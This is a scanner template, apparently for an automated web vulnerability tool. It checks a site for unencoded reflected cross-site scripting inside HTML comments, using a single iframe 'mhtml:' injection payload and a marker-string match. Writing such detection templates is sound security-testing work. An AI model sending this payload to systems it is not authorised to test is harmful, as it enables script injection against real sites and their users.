id: xss4-265
name: 'Raw XSS4 #24 in comment'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in comment'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      comment:
        - '<iframe src=mhtml:http://x!alert(nx4264)>'
    matchers:
      - type: word
        part: body
        words:
          - 'nx4264'
